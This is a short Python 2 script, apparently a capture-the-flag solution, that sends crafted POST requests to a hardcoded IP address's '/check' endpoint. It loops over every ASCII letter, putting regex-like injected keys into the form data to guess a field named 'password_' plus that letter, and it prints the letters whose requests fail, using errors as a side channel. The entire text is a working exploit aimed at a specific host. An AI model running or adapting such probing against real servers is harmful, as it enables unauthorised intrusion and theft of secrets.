import requests
import string

url = "http://202.120.7.194:8081/check"

for i in string.ascii_letters:
    data = {"|#|":"", "|this.*\) |[]":"+'a'+", "|\"|":"", "|this.password_{}.*|".format(i):""}
    try:
        res = requests.post(url, data=data)
    except:
        print i
